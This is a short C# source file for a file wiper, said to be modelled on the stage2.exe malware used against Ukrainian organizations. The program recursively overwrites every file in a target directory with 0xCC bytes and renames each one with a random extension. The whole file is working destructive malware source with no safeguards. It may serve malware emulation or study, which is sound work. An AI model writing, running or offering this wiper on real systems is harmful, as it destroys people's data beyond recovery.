// based on stage2.exe: https://www.microsoft.com/security/blog/2022/01/15/destructive-malware-targeting-ukrainian-organizations/
// args:
//  1: directory to target (recursive)


using System;
using System.IO;
using System.Linq;
using System.Collections.Generic;
using System.Threading.Tasks;

public static class FWiper {
    private static Random random = new Random();

    static void Main(string[] args){
        Console.WriteLine("file wiper no wiping");
        string directory = args[0];
        List<string> files = Directory.EnumerateFiles(directory, "*", SearchOption.AllDirectories).ToList();
        Parallel.ForEach(files, file => {
            ZeroFile(file);
        });
    }

    public static void ZeroFile(string inputFile){
        var size = (new FileInfo(inputFile)).Length;
        byte[] bytes = new byte[size];
        for(int i=0; i<size; i++){
            bytes[i] = 204;  // or whatever value here
        }
        File.WriteAllBytes(inputFile, bytes);
        var extension = RandomString(4);
        var newFile = inputFile + "." + extension;
        File.Move(inputFile, newFile);
        Console.WriteLine(inputFile + " => " + newFile);
    }

    // https://stackoverflow.com/a/1344242
    public static string RandomString(int length){
        const string chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
        return new string(Enumerable.Repeat(chars, length)
            .Select(s => s[random.Next(s.Length)]).ToArray());
    }
}
